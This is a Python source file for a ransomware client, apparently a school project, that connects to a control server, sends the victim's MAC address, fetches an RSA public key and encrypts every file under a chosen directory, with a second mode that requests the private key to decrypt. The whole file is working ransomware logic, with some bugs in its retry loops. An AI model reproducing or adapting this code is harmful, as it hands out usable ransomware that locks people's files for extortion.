import socket
from keyExchangeClient import RSAExchange
import os
import base64
from protocol import Secured_socket
from getmac import get_mac_address
from rsa import RSA


HEADER = 4
SERVER_ADDR = ("127.0.0.1", 4040)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
PATH = r"C:\Users\ADMIN\Desktop\school\projects\ransom-attack\test" #change it to the dir you want to encrypt
FILENAME = "ransome.txt"


def decrypt_files(private_key):
    rsa = RSA()
    for root, dirs, files in os.walk(PATH):
        for file in files:
            full_path = os.path.join(root, file)
            rsa.decrypt_file(full_path, private_key)

    del rsa    
    os.remove(FILENAME)


def cure_ransom(secured_conn):
    secured_conn.send("CURE" + get_mac_address())
    try:
        confirm_msg = secured_conn.recv()
        if not confirm_msg or confirm_msg[:4] == "EROR":
            raise ("Empty")
    except Exception as e:
        secured_conn.close()
        return
    while confirm_msg[:4] != "CNFM":
        secured_conn.send("CURE" + get_mac_address())
        try:
            confirm_msg = secured_conn().recv()
            if not confirm_msg or confirm_msg[:4] == "EROR":
                raise ("Empty")
        except Exception as e:
            secured_conn.close()
            return

    private_key = confirm_msg[4::]
    rsa = RSA()
    private_key = rsa.load_private_key(private_key)
    decrypt_files(private_key)


def encrypt_files(public_key):
    rsa = RSA()
    with open(FILENAME, 'w') as f:
            pass  # This creates the file or clears it if it exists
    
    rsa = RSA()
    for root, dirs, files in os.walk(PATH):
        for file in files:
            full_path = os.path.join(root, file)
            rsa.encrypt_file(full_path, public_key)

    del rsa    


def switch_keys(conn):
    key_switch = RSAExchange(conn)
    aes_key = os.urandom(32)  # AES-256 key
    key_switch.switch_keys(aes_key)
    aes_iv = os.urandom(16)

    iv_b64 = base64.b64encode(aes_iv).decode()
    conn.sendall(iv_b64.encode() + b"\n")

    del key_switch

    return (aes_key, aes_iv)


def connect_to_server(sock, addr, attack):
    try:
        sock.connect(addr)
    except Exception as e:
        return
    
    aes_key, aes_iv = switch_keys(sock)
    secured_conn = Secured_socket(sock, HEADER, aes_key, aes_iv)
    print("Secured connection esblished")

    cnfm_msg = secured_conn.recv()
    if cnfm_msg != "CNFM":
        secured_conn.close()
        return

    if attack:
        start_ransom(secured_conn)
    else:
        cure_ransom(secured_conn)
    

def get_key(secured_conn):
    secured_conn.send("SKEY")
    try:
        confirm_msg = secured_conn.recv()
        if not confirm_msg:
            raise ("Empty")
    except Exception as e:
        secured_conn.close()
        return
    while confirm_msg[:4] != "CNFM":
        secured_conn.send("SKEY")
        try:
            confirm_msg = secured_conn.recv()
            if not confirm_msg:
                raise ("Empty")
        except Exception as e:
            print(e)
            secured_conn.close()
            return
    
    pem_str = confirm_msg[4::]
    rsa = RSA()
    public_key = rsa.load_public_key(pem_str)
    del rsa
    return public_key


def start_ransom(secured_conn):
    secured_conn.send("STRT" + get_mac_address())
    try:
        confirm_msg = secured_conn.recv()
        if not confirm_msg:
            raise ("Empty")
    except Exception as e:
        secured_conn.close()
        return
    while confirm_msg != "CNFM":
        secured_conn.send("STRT" + get_mac_address())
        try:
            confirm_msg = secured_conn().recv()
            if not confirm_msg:
                raise ("Empty")
        except Exception as e:
            secured_conn.close()
            return

    public_key = get_key(secured_conn)
    encrypt_files(public_key)


if __name__ == "__main__":
    attack = not os.path.exists(FILENAME)
    connect_to_server(sock, SERVER_ADDR, attack) #attack = True, encrypt, false decrypt